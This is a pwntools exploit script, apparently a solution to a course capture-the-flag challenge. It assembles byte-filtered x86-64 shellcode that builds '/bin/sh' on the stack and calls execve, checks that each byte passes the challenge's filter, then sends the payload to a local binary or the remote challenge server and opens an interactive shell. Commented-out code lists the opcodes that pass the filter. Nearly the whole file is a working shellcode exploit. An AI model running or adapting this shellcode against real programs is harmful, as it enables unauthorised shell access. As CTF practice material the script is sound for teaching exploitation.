from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

context.arch='amd64'
context.os='linux'

gs = '''
break main
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-shellcode-1.chals.io", 443, ssl=True, sni="cse4850-shellcode-1.chals.io")
    return process(e.path)

def asm_check(shell):
    invalid = []
    for b in shell:
        if b != 5 and b & 2 == 0:
            invalid.append(b)
    return invalid

shell = asm("""
    /* rsi = 0 */
    add si, 0x2
    sub si, 0x3

    /* rdx = 0 */
    push rsi
    pop rdx

    /* Set up rdi for later */
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi
    pop rdi

    /* On stack: 0x68732f6e69622f */
    push rsi
    pop rbx
    mov bl, 0x66
    inc bl
    inc bl
    push bx
    mov bx, 0x732f
    push bx
    mov bx, 0x6e67
    inc bl
    inc bl
    push bx
    mov bx, 0x622f
    push bx

    /* rax = 0x3b */
    push rsi
    pop rbx
    mov bl, 0x3b
    xchg eax, ebx

    /* rdi = rsp */
    xchg di, sp

    /* syscall */
    syscall
""")

print(' '.join('{:02x}'.format(x) for x in shell))
invalid = asm_check(shell)
log.info(f"Ran into {len(invalid)} invalid bytes")
if len(invalid) > 0:
    for b in invalid:
        log.info(f"Invalid byte: {hex(b)}")
    exit()

p = start()

p.sendline(shell)

p.interactive()

# def is_good(s):
#     for inst in ['.byte', 'bad', 'rex']:
#         if inst in s:
#             return False
#     return True

# log.info("All 1 byte instructions")
# for i in range(255):
#     if i & 2 != 0:
#         op = disasm(bytes([i]))
#         if is_good(op):
#             print(op)

# log.info("All 2 byte instructions")
# for i in range(255):
#     for j in range(255):
#         if i & 2 != 0 and j & 2 != 0:
#             op = disasm(bytes([i, j]))
#             if is_good(op):
#                 print(op)
